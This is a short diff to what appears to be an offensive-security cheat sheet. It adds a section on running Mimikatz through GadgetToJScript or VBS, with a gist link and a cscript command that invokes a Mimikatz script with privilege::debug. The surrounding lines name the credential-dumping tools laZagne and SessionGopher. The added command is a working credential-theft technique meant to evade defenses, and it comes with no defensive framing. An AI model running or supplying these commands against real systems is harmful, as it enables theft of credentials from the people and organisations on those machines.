@@ -1667,6 +1667,17 @@ laZagne.exe browsers -firefox
 
 
 
+#### [](#header-4) Running Mimikatz with GadgetToJScript or VBS
+
+```powershell
+#https://gist.github.com/med0x2e/cc10d42b1f581507013e801da2651c74
+
+cscript mimi.js privilege::debug < safe.txt
+
+```
+
+
+
 #### [](#header-4) SessionGopher
 
 ```powershell
